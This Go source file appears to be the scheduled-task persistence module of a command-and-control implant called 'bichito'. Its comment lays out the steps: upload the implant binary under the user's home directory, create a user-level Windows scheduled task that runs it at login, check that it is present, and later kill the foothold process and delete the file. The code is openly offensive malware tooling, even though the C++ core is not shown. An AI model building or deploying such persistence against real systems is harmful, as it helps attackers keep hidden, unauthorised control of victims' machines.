// +build schtasks

package persistence

import (
	"bichito/modules/persistence/windows_schtasks"
)


/*
Windows Persistence 
	--> User-Mode 
		--> SCHTASKS Persistence 
			--> Triggered: User Login

AddPersistence -->
	A.Decode JSON Persistence parameters
	B.Upload one of the parameters (the implant as a binary string blob) on target PATH (relative to user home)
	C.Using C++ (windows_schtasks.cpp), create a User-level schtasks, which on log-in execute target PATH executable file

CheckPersistence -->
	A.Decode JSON Persistence parameters
	B.Execute accesschk on target PATH to check if Implant executable is present on disk

RemovePersistence -->
	A.Decode JSON Persistence parameters
	B.Using C++ (windows_schtasks.cpp),, remove target name schtasks
	C.Spawn a process to kill the foothold process,sleep,and remove target PATH implant executable (previously persisted)
*/

func AddPersistence(jsonPersistence string,blob string) (bool,string){

	err,result := windows_schtasks.AddPersistenceSchtasks(jsonPersistence,blob)
	if err != false {
		return true,result
	}

	return false,"Persisted"
}

func CheckPersistence(jsonPersistence string) (bool,string){

	err,result := windows_schtasks.CheckPersistenceSchtasks(jsonPersistence)
	if err != false {
		return true,result
	}

	return false,result
}


func RemovePersistence(jsonPersistence string) (bool,string){

	err,result := windows_schtasks.RemovePersistenceSchtasks(jsonPersistence)
	if err != false {
		return true,result
	}

	return false,"Persistence Removed"
}